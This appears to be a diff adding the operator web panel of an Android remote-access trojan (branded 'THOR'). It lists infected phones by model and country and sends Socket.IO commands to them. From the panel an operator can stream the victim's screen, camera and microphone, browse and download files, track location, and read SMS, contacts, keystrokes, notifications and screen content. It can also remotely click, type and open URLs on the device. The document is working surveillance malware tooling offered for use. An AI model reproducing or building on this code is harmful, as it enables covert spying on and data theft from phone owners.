+              <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+            </button>
+        </div>
+      </div>
+    </div>
+</div>
+      </div>
+      </div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io();
+let clients = [];
+let selectedSet = new Set();
+let currentTargetId = null;
+let currentModule = null;
+let openMenuId = null;
+
+// --- SOCKET LOGIC ---
+socket.on('initial_clients', (data) => {
+    clients = data;
+    renderClients();
+});
+socket.on('client_connected', (client) => {
+    clients.push(client);
+    renderClients();
+});
+socket.on('client_disconnected', (id) => {
+    clients = clients.filter(c => c.id !== id);
+    if (currentTargetId === id) currentTargetId = null;
+    renderClients();
+});
+
+// --- UI LOGIC ---
+function renderClients() {
+    const list = document.getElementById('client-list');
+    list.innerHTML = '';
+    if (clients.length === 0) {
+        list.innerHTML = `<div id="client-list-empty"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>NO ACTIVE CLIENTS</div>`;
+        return;
+    }
+    clients.forEach(d => {
+        const flag = getFlagEmoji(d.details.country);
+        const card = document.createElement('div');
+        card.className = `client-card ${currentTargetId === d.id ? 'selected' : ''}`;
+        card.id = 'card-' + d.id;
+        card.onclick = () => selectClient(d.id);
+        card.innerHTML = `
+            <div class="cc-flag">${flag}</div>
+            <div class="cc-info">
+              <div class="cc-name">${d.details.model}</div>
+              <div class="cc-meta">
+                <span class="cc-country">${d.details.country || 'Unknown'}</span> // ${d.id.split('_').pop()}
+              </div>
+            </div>
+            <div class="cc-online on"></div>
+            <div class="cc-dots" onclick="openMenu('${d.id}',event)">&#8942;</div>
+            <div class="cc-dropdown" id="menu-${d.id}">
+              <div class="cc-dropdown-item" onclick="clientAction('phone_info','${d.id}')">Phone Info</div>
+              <div class="cc-dropdown-item" onclick="clientAction('block','${d.id}')">Block Client</div>
+            </div>
+        `;
+        list.appendChild(card);
+    });
+}
+
+function selectClient(id) {
+    currentTargetId = id;
+    selectedSet.clear();
+    selectedSet.add(id); // Keep selectedSet for compatibility with some bulk actions if needed
+    renderClients();
+    if (currentModule) featureAction(currentModule);
+}
+
+function featureAction(feat) {
+    currentModule = feat;
+    document.querySelectorAll('.feat-btn').forEach(b => b.classList.remove('active'));
+    if (event && event.currentTarget) event.currentTarget.classList.add('active');
+
+    if (!currentTargetId) { showToast("SELECT A CLIENT FIRST"); return; }
+    const out = document.getElementById('output-area');
+    
+    switch(feat) {
+        case 'screen_monitor':
+            out.innerHTML = `
+              <div class="screen-phone-frame">
+                <div class="phone-shell" id="screen-shell">
+                  <div class="phone-notch"></div>
+                  <div class="phone-offline" id="screen-offline">
+                    <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99z"/></svg>
+                    STREAM OFFLINE
+                  </div>
+                </div>
+                <div class="screen-ctrl-row">
+                  <button class="action-btn" onclick="sendOrder('screen_share',{action:'start'})">START</button>
+                  <button class="action-btn" style="border-color:var(--red-bright);" onclick="sendOrder('screen_share',{action:'stop'})">STOP</button>
+                </div>
+              </div>`;
+            break;
+
+        case 'camera':
+            out.innerHTML = `
+              <div class="camera-phone-frame">
+                <div class="camera-shell" id="camera-shell">
+                  <div class="phone-notch"></div>
+                  <div class="cam-offline" id="cam-offline">
+                    <svg viewBox="0 0 24 24"><path d="M9.4 3L7.4 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2h-3.4l-2-2H9.4z"/><circle cx="12" cy="12" r="3.2"/></svg>
+                    CAM OFFLINE
+                  </div>
+                </div>
+                <div class="cam-ctrl-row">
+                  <button class="action-btn" onclick="switchCam(0)">FRONT</button>
+                  <button class="action-btn" onclick="switchCam(1)">BACK</button>
+                  <button class="action-btn" style="border-color:var(--red-bright);" onclick="sendOrder('stop_camera')">STOP</button>
+                </div>
+              </div>`;
+            window._camMode = 0;
+            break;
+
+        case 'microphone':
+            out.innerHTML = `
+              <div class="mic-panel" style="justify-content: flex-start; padding-top: 10px;">
+                <h3 style="font-family:var(--font-display); color:var(--red-bright); font-size:12px; margin-bottom:10px; letter-spacing:2px;">MICROPHONE CONTROL</h3>
+                
+                <div class="mic-settings-card" style="background:rgba(20,0,0,0.4); border:1px solid var(--border-dim); border-radius:8px; padding:12px; width:100%; max-width:380px; margin-bottom:15px;">
+                  <div style="font-family:var(--font-mono); font-size:9px; color:var(--red-dim); margin-bottom:8px;">// AUDIO CONFIGURATION</div>
+                  <div style="display:flex; align-items:center; gap:10px; margin-bottom:12px;">
+                    <label style="font-family:var(--font-mono); font-size:10px; color:var(--text-dim);">Quality:</label>
+                    <select id="mic-sample-rate" style="background:#000; color:var(--red-bright); border:1px solid var(--border); padding:4px 8px; font-family:var(--font-mono); font-size:10px; outline:none; flex:1; cursor:pointer;">
+                      <option value="8000">8000 Hz (Low)</option>
+                      <option value="11025" selected>11025 Hz (Standard)</option>
+                      <option value="16000">16000 Hz (Mid)</option>
+                      <option value="22050">22050 Hz (High)</option>
+                      <option value="44100">44100 Hz (CD Quality)</option>
+                    </select>
+                  </div>
+                  
+                  <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
+                    <button class="action-btn" id="live-mic-btn" onclick="toggleLiveMic()" style="padding:7px 0;">START LIVE</button>
+                    <button class="action-btn" id="rec-mic-btn" onclick="toggleRecordMic()" style="padding:7px 0;">START RECORD</button>
+                  </div>
+                </div>
+
+                <div class="mic-visual-wrap" style="display:flex; flex-direction:column; align-items:center; gap:12px; width:100%;">
+                    <div class="mic-status" id="mic-status" style="font-size:10px; letter-spacing:3px;">IDLE</div>
+                    <div class="mic-icon-wrap" style="width:60px; height:60px;">
+                      <div class="mic-ring" id="mic-r1"></div>
+                      <div class="mic-ring r2" id="mic-r2"></div>
+                      <div class="mic-ring r3" id="mic-r3"></div>
+                      <div class="mic-icon-btn" style="width:50px; height:50px; cursor:default;">
+                        <svg viewBox="0 0 24 24" style="width:22px; height:22px;"><path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg>
+                      </div>
+                    </div>
+                    <canvas id="mic-waveform" width="340" height="60" style="margin-top:5px; border-radius:4px; border:1px solid var(--border-dim);"></canvas>
+                </div>
+
+                <div id="mic-recordings" style="font-family:var(--font-mono); font-size:10px; color:var(--text-dim); width:100%; max-width:380px; margin-top:15px; border-top:1px solid var(--border-dim); padding-top:10px; max-height:100px; overflow-y:auto;">
+                    <div style="color:var(--red-dim); margin-bottom:5px;">// AUDIO CAPTURES</div>
+                </div>
+              </div>`;
+            initWaveform();
+            break;
+
+        case 'file_manager':
+            out.innerHTML = `
+              <div id="file-explorer">
+                <div class="fm-path-bar">
+                  <button class="fm-back-btn" onclick="fmBack()">&#8592; BACK</button>
+                  PATH: <span id="fm-path">/sdcard</span>
+                </div>
+                <div class="fm-list" id="fm-list"><div style="padding:20px;font-family:var(--font-mono);font-size:10px;color:var(--red-dim);">Fetching...</div></div>
+                <div class="fm-dl-bar">
+                  <span id="fm-sel-count">0 files selected</span>
+                  <button class="fm-dl-btn" onclick="fmDownloadSelected()">
+                    <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                    DOWNLOAD
+                  </button>
+                </div>
+              </div>`;
+            window._fmPath = '/sdcard';
+            window._fmSelected = new Set();
+            sendOrder('file_manager', {path: '/sdcard'});
+            break;
+
+        case 'location':
+            out.innerHTML = `<div id="location-info" style="font-family:var(--font-mono);font-size:10px;margin-bottom:5px;color:var(--red-bright);padding:8px;">Locating...</div><div id="map-container"></div>`;
+            sendOrder('location');
+            break;
+
+        case 'messages':
+            out.innerHTML = `<div class="table-container" style="overflow-y:auto;height:100%;"><table><thead><tr><th>FROM</th><th>BODY</th></tr></thead><tbody id="sms-list"></tbody></table></div>`;
+            sendOrder('sms');
+            break;
+
+        case 'contacts':
+            out.innerHTML = `<div class="table-container" style="overflow-y:auto;height:100%;"><table><thead><tr><th>NAME</th><th>NUMBER</th></tr></thead><tbody id="contacts-list"></tbody></table></div>`;
+            sendOrder('contacts');
+            break;
+
+        case 'device_info':
+            out.innerHTML = `<div id="device-info-view" style="font-family:var(--font-mono);font-size:10px;padding:14px;color:var(--text-dim);">Fetching device info...</div>`;
+            sendOrder('device_info');
+            break;
+
+        case 'screen_reader':
+            out.innerHTML = `
+              <div style="height:100%;display:flex;flex-direction:column;">
+                <div id="reader-view" style="font-family:var(--font-mono);font-size:10px;color:#fff;overflow-y:auto;flex:1;border:1px solid var(--border-dim);padding:10px;border-radius:4px;">Awaiting structure...</div>
+                <div style="display:flex;gap:8px;padding-top:8px;flex-shrink:0;">
+                  <button class="action-btn" style="width:80px;" onclick="sendOrder('screen_reader',{action:'start'})">START</button>
+                  <button class="action-btn" style="width:80px;border-color:var(--red-bright);" onclick="sendOrder('screen_reader',{action:'stop'})">STOP</button>
+                </div>
+              </div>`;
+            break;
+
+        case 'keylogger':
+            out.innerHTML = `<div id="keylog-list" style="font-family:var(--font-mono);font-size:10px;color:#fff;overflow-y:auto;height:100%;padding:8px;">Awaiting keystrokes...</div>`;
+            break;
+
+        case 'notifications':
+            out.innerHTML = `<div id="notification-list" style="font-family:var(--font-mono);font-size:10px;color:#fff;overflow-y:auto;height:100%;padding:8px;">Awaiting notifications...</div>`;
+            break;
+
+        case 'automation':
+            out.innerHTML = `
+              <div class="auto-form">
+                <h4 style="font-family:var(--font-display);font-size:10px;color:var(--red-bright);">SEND_AUTOMATION_COMMAND</h4>
+                <input type="text" id="auto-arg" placeholder="Argument (Text, ID, App, or URL)">
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+                  <button class="action-btn" onclick="sendAuto('click_text')">CLICK_TEXT</button>
+                  <button class="action-btn" onclick="sendAuto('click_id')">CLICK_ID</button>
+                  <button class="action-btn" onclick="sendAuto('open_app')">OPEN_APP</button>
+                  <button class="action-btn" onclick="sendAuto('open_url')">OPEN_URL</button>
+                  <button class="action-btn" onclick="sendAuto('input_text')">TYPE_TEXT</button>
+                  <button class="action-btn" style="color:var(--text-dim);" onclick="sendAuto('back')">BACK</button>
+                  <button class="action-btn" style="color:var(--text-dim);" onclick="sendAuto('home')">HOME</button>
+                  <button class="action-btn" style="color:var(--text-dim);" onclick="sendAuto('recents')">RECENTS</button>
+                </div>
+              </div>`;
+            break;
+    }
+}
+
+function sendOrder(order, params = {}) {
+    socket.emit('order', { id: currentTargetId, order, params });
+}
+function sendAuto(cmd) {
+    const arg = document.getElementById('auto-arg').value;
+    sendOrder('automation', {command: cmd, argument: arg});
+}
+
+socket.on('client_data', (msg) => {
+    if (msg.id !== currentTargetId) return;
+    const d = msg.data;
+
+    // ── CAMERA ──
+    if (d.type === 'camera') {
+        const shell = document.getElementById('camera-shell');
+        if (shell) {
+            shell.innerHTML = `<div class="phone-notch"></div><img src="data:image/jpeg;base64,${d.image}" class="${window._camMode===1?'back-cam':''}">`;
+        }
+
+    // ── SCREEN SHARE ──
+    } else if (d.type === 'screen_share') {
+        const shell = document.getElementById('screen-shell');
+        if (shell) {
+            shell.innerHTML = `<div class="phone-notch"></div><img src="data:image/jpeg;base64,${d.image}">`;
+        }
+
+    // ── FILE MANAGER ──
+    } else if (d.type === 'file_manager') {
+        const list = document.getElementById('fm-list');
+        if (!list) return;
+        list.innerHTML = '';
+        window._fmSelected = new Set();
+        updateFmSelCount();
+        d.data.forEach(f => {
+            const item = document.createElement('div');
+            item.className = 'file-item';
+            item.dataset.path = f.path;
+            item.dataset.name = f.name;
+            item.dataset.isdir = f.isDir ? '1' : '0';
+            item.innerHTML = `
+              <div class="fi-check"></div>
+              <span class="fi-icon">${f.isDir ? '📁' : '📄'}</span>
+              <span class="fi-name">${f.name}</span>
+              <span class="fi-size">${f.isDir ? '' : (f.size ? formatSize(f.size) : '')}</span>`;
+            item.onclick = (e) => {
+                if (f.isDir) {
+                    window._fmPath = f.path;
+                    document.getElementById('fm-path').textContent = f.path;
+                    sendOrder('file_manager', {path: f.path});
+                } else {
+                    item.classList.toggle('selected');
+                    if (item.classList.contains('selected')) window._fmSelected.add(f.path);
+                    else window._fmSelected.delete(f.path);
+                    updateFmSelCount();
+                }
+            };
+            list.appendChild(item);
+        });
+
+    // ── LOCATION ──
+    } else if (d.type === 'location') {
+        const info = document.getElementById('location-info');
+        if (info) info.innerText = `LAT: ${d.lat}  //  LNG: ${d.lng}  //  ${d.address || 'Unknown'}`;
+        if (window.leafMap) window.leafMap.remove();
+        window.leafMap = L.map('map-container').setView([d.lat, d.lng], 15);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window.leafMap);
+        L.marker([d.lat, d.lng]).addTo(window.leafMap);
+
+    // ── DEVICE INFO ──
+    } else if (d.type === 'device_info') {
+        const view = document.getElementById('device-info-view');
+        if (view) {
+            let html = '<div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; padding:10px;">';
+            const renderSection = (title, obj) => {
+                let section = `<div style="margin-bottom:15px;"><h4 style="color:var(--red-bright); font-size:10px; border-bottom:1px solid var(--border-dim); padding-bottom:6px; margin-bottom:10px; letter-spacing:1px; font-family:var(--font-display);">${title.toUpperCase()}</h4>`;
+                for (let key in obj) {
+                    section += `<div style="display:flex; justify-content:space-between; margin-bottom:5px; font-family:var(--font-mono); font-size:10px;"><span style="color:var(--text-dim);">${key}:</span> <span style="color:var(--text);">${obj[key]}</span></div>`;
+                }
+                section += '</div>';
+                return section;
+            };
+            if (d.system) html += renderSection('System', d.system);
+            if (d.hardware) html += renderSection('Hardware', d.hardware);
+            if (d.locale) html += renderSection('Locale', d.locale);
+            if (d.error) html = `<div style="color:var(--red-bright); padding:20px;">ERROR: ${d.error}</div>`;
+            html += '</div>';
+            view.innerHTML = html;
+        }
+
+    // ── SMS ──
+    } else if (d.type === 'sms') {
+        const list = document.getElementById('sms-list');
+        if (list) list.innerHTML = d.data.map(s => `<tr><td>${s.address}</td><td>${s.body}</td></tr>`).join('');
+
+    // ── CONTACTS ──
+    } else if (d.type === 'contacts') {
+        const list = document.getElementById('contacts-list');
+        if (list) list.innerHTML = d.data.map(c => `<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('');
+
+    // ── KEYLOG ──
+    } else if (d.type === 'keylog') {
+        const list = document.getElementById('keylog-list');
+        if (list) {
+            if (list.innerHTML.includes('Awaiting')) list.innerHTML = '';
+            const div = document.createElement('div');
+            div.style.marginBottom = '4px';
+            div.innerHTML = `<span style="color:var(--red-bright)">[${d.time}]</span> <span style="color:var(--red-dim)">${d.app}:</span> ${d.data}`;
+            list.prepend(div);
+        }
+
+    // ── NOTIFICATION ──
+    } else if (d.type === 'notification') {
+        const list = document.getElementById('notification-list');
+        if (list) {
+            if (list.innerHTML.includes('Awaiting')) list.innerHTML = '';
+            const div = document.createElement('div');
+            div.style = 'margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid rgba(100,0,0,0.2);';
+            div.innerHTML = `<span style="color:var(--red-bright)">[${d.time}]</span> <strong style="color:var(--red-bright)">${d.title}</strong><br><span style="color:var(--text-dim);font-size:9px;">${d.app}</span><br>${d.content}`;
+            list.prepend(div);
+        }
+
+    // ── SCREEN READER ──
+    } else if (d.type === 'screen_reader') {
+        const view = document.getElementById('reader-view');
+        if (view) {
+            if (view.innerHTML.includes('Awaiting')) view.innerHTML = '';
+            view.innerHTML = d.nodes.map(n => `<div style="margin-bottom:4px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:2px;">[${n.cl}] ${n.t || n.c || '(empty)'}</div>`).join('');
+        }
+
+    // ── MIC SAVED (after recording) ──
+    } else if (d.type === 'mic_saved') {
+        const recs = document.getElementById('mic-recordings');
+        if (recs) {
+            const a = document.createElement('a');
+            a.href = d.file; a.target = '_blank';
+            a.style = 'color:var(--green-ok);display:block;padding:2px 0;';
+            a.textContent = '▶ ' + d.file.split('/').pop();
+            recs.prepend(a);
+        }
+        stopMic();
+    } else if (d.type === 'mic_chunk') {
+        playAudioChunk(d.data);
+    }
+});
+// --- HELPER UI ---
+function filterClients(q) {
+    const t = q.toLowerCase();
+    document.querySelectorAll('.client-card').forEach(c => {
+        const m = c.innerText.toLowerCase().includes(t);
+        c.style.display = m ? '' : 'none';
+    });
+}
+function openMenu(id, e) {
+    e.stopPropagation();
+    const m = document.getElementById('menu-' + id);
+    m.classList.toggle('open');
+    openMenuId = id;
+}
+document.addEventListener('click', () => { if (openMenuId) { const m = document.getElementById('menu-' + openMenuId); if (m) m.classList.remove('open'); } });
+function getFlagEmoji(country) {
+    const map = { 'Russia':'🇷🇺', 'Germany':'🇩🇪', 'India':'🇮🇳', 'China':'🇨🇳', 'USA':'🇺🇸', 'Brazil':'🇧🇷' };
+    return map[country] || '🌐';
+}
+function bulkAction(a) { console.log('Bulk:', a, [...selectedSet]); }
+function clientAction(a, id) { console.log('Client:', a, id); }
+// ── CAMERA helpers ──
+function switchCam(id) {
+    window._camMode = id;
+    const shell = document.getElementById('camera-shell');
+    if (shell) shell.innerHTML = `<div class="phone-notch"></div><div class="cam-offline" id="cam-offline"><svg viewBox="0 0 24 24"><path d="M9.4 3L7.4 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2h-3.4l-2-2H9.4z"/><circle cx="12" cy="12" r="3.2"/></svg>SWITCHING...</div>`;
+    sendOrder('camera', {camera_id: id, quality: 40});
+}
+
+// ── MICROPHONE helpers ──
+let isMicLive = false;
+let isMicRecording = false;
+let currentSampleRate = 11025;
+let audioContext = null;
+let nextStartTime = 0;
+let _waveCtx = null;
+let _waveAnim = null;
+let _waveLevels = new Array(40).fill(0);
+
+function initWaveform() {
+    const canvas = document.getElementById('mic-waveform');
+    if (!canvas) return;
+    _waveCtx = canvas.getContext('2d');
+    drawWave();
+}
+
+function drawWave() {
+    const canvas = document.getElementById('mic-waveform');
+    if (!canvas || !_waveCtx) return;
+    const ctx = _waveCtx;
+    const W = canvas.width, H = canvas.height;
+    ctx.clearRect(0, 0, W, H);
+    ctx.fillStyle = 'rgba(8,0,0,0.8)';
+    ctx.fillRect(0, 0, W, H);
+    const barW = W / _waveLevels.length;
+    _waveLevels.forEach((lvl, i) => {
+        const h = (isMicLive || isMicRecording) ? lvl * H * 0.85 : (Math.sin(Date.now() / 800 + i * 0.4) * 0.08 + 0.1) * H;
+        const x = i * barW;
+        const grad = ctx.createLinearGradient(0, H/2 - h/2, 0, H/2 + h/2);
+        grad.addColorStop(0, 'rgba(255,26,26,0.9)');
+        grad.addColorStop(1, 'rgba(120,0,0,0.5)');
+        ctx.fillStyle = grad;
+        ctx.beginPath();
+        if (ctx.roundRect) ctx.roundRect(x + 1, H/2 - h/2, barW - 2, h, 2);
+        else ctx.rect(x + 1, H/2 - h/2, barW - 2, h);
+        ctx.fill();
+    });
+    _waveAnim = requestAnimationFrame(drawWave);
+    _waveLevels = _waveLevels.map(v => v * 0.85);
+}
+
+function initAudioContext() {
+    try {
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        nextStartTime = audioContext.currentTime;
+    } catch(e) { console.error("AudioContext error", e); }
+}
+
+function playAudioChunk(base64Data) {
+    if (!audioContext || !isMicLive) return;
+    try {
+        const binary = atob(base64Data);
+        const len = binary.length;
+        const bytes = new Int16Array(len / 2);
+        for (let i = 0; i < len; i += 2) {
+            bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
+        }
+        const float32 = new Float32Array(bytes.length);
+        for (let i = 0; i < bytes.length; i++) {
+            float32[i] = bytes[i] / 32768.0;
+        }
+        const buffer = audioContext.createBuffer(1, float32.length, currentSampleRate);
+        buffer.copyToChannel(float32, 0);
+        const source = audioContext.createBufferSource();
+        source.buffer = buffer;
+        source.connect(audioContext.destination);
+        const currentTime = audioContext.currentTime;
+        if (nextStartTime < currentTime) nextStartTime = currentTime;
+        source.start(nextStartTime);
+        nextStartTime += buffer.duration;
+        // Pulse waveform
+        for (let i = 0; i < _waveLevels.length; i++) {
+            _waveLevels[i] = Math.max(_waveLevels[i], Math.random() * 0.7 + 0.2);
+        }
+    } catch (e) { }
+}
+
+function toggleLiveMic() {
+    if (isMicLive) {
+        stopMic();
+    } else {
+        if (isMicRecording) stopMic();
+        isMicLive = true;
+        currentSampleRate = parseInt(document.getElementById('mic-sample-rate').value);
+        sendOrder('mic', {action: 'start', mode: 'live', sample_rate: currentSampleRate});
+        updateMicUI('live', true);
+        initAudioContext();
+    }
+}
+
+function toggleRecordMic() {
+    if (isMicRecording) {
+        stopMic();
+    } else {
+        if (isMicLive) stopMic();
+        isMicRecording = true;
+        currentSampleRate = parseInt(document.getElementById('mic-sample-rate').value);
+        sendOrder('mic', {action: 'start', mode: 'record', sample_rate: currentSampleRate});
+        updateMicUI('record', true);
+    }
+}
+
+function stopMic() {
+    sendOrder('mic', {action: 'stop'});
+    isMicLive = false;
+    isMicRecording = false;
+    if (audioContext) {
+        audioContext.close();
+        audioContext = null;
+    }
+    updateMicUI(null, false);
+}
+
+function updateMicUI(mode, active) {
+    const liveBtn = document.getElementById('live-mic-btn');
+    const recBtn = document.getElementById('rec-mic-btn');
+    const status = document.getElementById('mic-status');
+    const rings = ['mic-r1','mic-r2','mic-r3'];
+
+    if (!active) {
+        if (liveBtn) { liveBtn.textContent = 'START LIVE'; liveBtn.classList.remove('active'); }
+        if (recBtn) { recBtn.textContent = 'START RECORD'; recBtn.classList.remove('active'); }
+        if (status) { status.textContent = 'IDLE'; status.classList.remove('on'); }
+        rings.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) { el.classList.remove('active'); el.style.animation = 'mic-ring-idle 2s ease-in-out infinite'; }
+        });
+        return;
+    }
+
+    if (mode === 'live') {
+        if (liveBtn) { liveBtn.textContent = 'STOP LIVE'; liveBtn.classList.add('active'); }
+        if (status) { status.textContent = '● LIVE LISTENING'; status.classList.add('on'); }
+    } else {
+        if (recBtn) { recBtn.textContent = 'STOP RECORD'; recBtn.classList.add('active'); }
+        if (status) { status.textContent = '⏺ RECORDING'; status.classList.add('on'); }
+    }
+
+    rings.forEach(id => {
+        const el = document.getElementById(id);
+        if (el) { el.classList.add('active'); el.style.animation = 'mic-ring-idle 0.6s ease-in-out infinite'; }
+    });
+}
+
+// ── FILE MANAGER helpers ──
+function fmBack() {
+    const parts = (window._fmPath || '/sdcard').split('/').filter(Boolean);
+    if (parts.length <= 1) return;
+    parts.pop();
+    const parent = '/' + parts.join('/');
+    window._fmPath = parent;
+    document.getElementById('fm-path').textContent = parent;
+    sendOrder('file_manager', {path: parent});
+}
+function updateFmSelCount() {
+    const el = document.getElementById('fm-sel-count');
+    if (el) el.textContent = (window._fmSelected?.size || 0) + ' file(s) selected';
+}
+function fmDownloadSelected() {
+    if (!window._fmSelected || window._fmSelected.size === 0) return;
+    window._fmSelected.forEach(path => {
+        socket.emit('order', { id: currentTargetId, order: 'file_download', params: { path } });
+    });
+}
+function formatSize(bytes) {
+    if (bytes < 1024) return bytes + 'B';
+    if (bytes < 1048576) return (bytes/1024).toFixed(1) + 'KB';
+    return (bytes/1048576).toFixed(1) + 'MB';
+}
+
+// ── THOR TOAST — replaces browser alert() ──
+let _toastTimer = null;
+function showToast(msg, duration = 2000) {
+    const t = document.getElementById('thor-toast');
+    t.textContent = '';        // clear so ::before pseudo still renders
+    t.setAttribute('data-msg', msg);
+    t.style.setProperty('--msg', `"${msg}"`);
+    // Use a text node so ::before still works
+    t.childNodes.forEach(n => n.remove());
+    t.appendChild(document.createTextNode(msg));
+    t.classList.add('show');
+    if (_toastTimer) clearTimeout(_toastTimer);
+    _toastTimer = setTimeout(() => t.classList.remove('show'), duration);
+}
+
+</script>
+</body>
+</html>
